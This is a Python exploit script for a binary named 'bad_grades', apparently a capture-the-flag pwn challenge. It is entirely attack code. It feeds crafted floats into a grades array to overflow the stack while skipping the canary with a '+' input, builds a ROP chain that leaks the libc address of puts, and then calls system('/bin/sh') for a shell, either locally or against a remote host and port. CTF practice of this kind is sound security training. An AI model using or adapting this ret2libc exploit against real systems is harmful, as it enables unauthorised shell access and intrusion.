#!/usr/bin/python3
from pwncus import *
from time import sleep
import struct

# context.log_level = 'debug'
exe = context.binary = ELF('./bad_grades_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def hex2float(value):
    try:
        return struct.unpack('>d', bytes.fromhex(hex(value)[2:].rjust(16, '0')))[0]
    except struct.error:
        return 0.0

def send_floats(value):
    for v in value:
        sla(b': ', str(v).encode())

def exploit():
    main_addr = 0x401108
    view_addr = 0x400fd5
    current_grade_addr = 0x4011b0
    pop_rdi = 0x0401263
    ret = 0x400666

    # Leak libc address
    sla(b'> ', b'2')
    sla(b': ', b'39')
    send_floats(
        [1.0] * 33 + [
        '+',
        5.0,
        # hex2float(ret),
        hex2float(pop_rdi),
        hex2float(exe.got.puts),
        hex2float(exe.plt.puts),
        hex2float(main_addr)]
    )

    rl()
    leak = fixleak(rl()[:-1])
    libc.address = leak - libc.sym.puts
    info(f'Leak: {hex(leak)}')
    info(f'Libc base: {hex(libc.address)}')
    sleep(0.5)

    # Get shell
    sla(b'> ', b'2')
    sla(b': ', b'39')
    send_floats(
        [0.0] * 33 + [
        '+',
        5.0,
        hex2float(ret),
        hex2float(pop_rdi),
        hex2float(next(libc.search(b'/bin/sh'))),
        hex2float(libc.sym.system)]
    )

    interactive()

if __name__ == '__main__':
    exploit()
